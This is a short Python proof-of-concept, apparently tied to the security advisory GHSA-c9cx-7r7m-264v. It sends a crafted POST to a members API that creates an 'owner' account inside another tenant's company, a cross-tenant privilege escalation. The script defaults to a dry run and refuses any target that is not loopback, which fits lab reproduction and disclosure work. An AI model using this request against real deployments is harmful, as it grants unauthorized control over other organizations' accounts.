#!/usr/bin/env python3
"""Laboratory-only reproducer for GHSA-c9cx-7r7m-264v.

Default behavior is dry-run. Network execution is restricted to loopback hosts.
"""

import argparse
import json
import sys
import urllib.error
import urllib.request
from urllib.parse import urlparse


def parse_args():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--base-url", required=True)
    parser.add_argument("--token", required=True)
    parser.add_argument("--active-company-id", required=True)
    parser.add_argument("--victim-company-id", required=True, type=int)
    parser.add_argument("--email", default="poc-user@example.invalid")
    parser.add_argument("--name", default="Authorized Lab PoC")
    parser.add_argument("--password", default="Lab-PoC-Only-Change-Me!")
    parser.add_argument("--role", default="owner")
    parser.add_argument("--execute", action="store_true")
    return parser.parse_args()


def main():
    args = parse_args()
    parsed = urlparse(args.base_url)
    if parsed.hostname not in {"127.0.0.1", "localhost", "::1"}:
        raise SystemExit("Refusing non-loopback target; use an isolated local lab.")

    endpoint = args.base_url.rstrip("/") + "/api/v1/members"
    body = {
        "name": args.name,
        "email": args.email,
        "phone": None,
        "password": args.password,
        "companies": [{"id": args.victim_company_id, "role": args.role}],
    }
    headers = {
        "Authorization": "Bearer " + args.token,
        "company": str(args.active_company_id),
        "Content-Type": "application/json",
        "Accept": "application/json",
    }

    redacted = dict(headers)
    redacted["Authorization"] = "Bearer <redacted>"
    print("POST", endpoint)
    print(json.dumps({"headers": redacted, "body": body}, indent=2))

    if not args.execute:
        print("Dry-run only: add --execute in an authorized local lab.")
        return 0

    request = urllib.request.Request(
        endpoint,
        data=json.dumps(body).encode(),
        headers=headers,
        method="POST",
    )
    try:
        with urllib.request.urlopen(request, timeout=10) as response:
            print("HTTP", response.status)
            print(response.read().decode(errors="replace"))
            return 0
    except urllib.error.HTTPError as error:
        print("HTTP", error.code)
        print(error.read().decode(errors="replace"))
        return 1


if __name__ == "__main__":
    sys.exit(main())

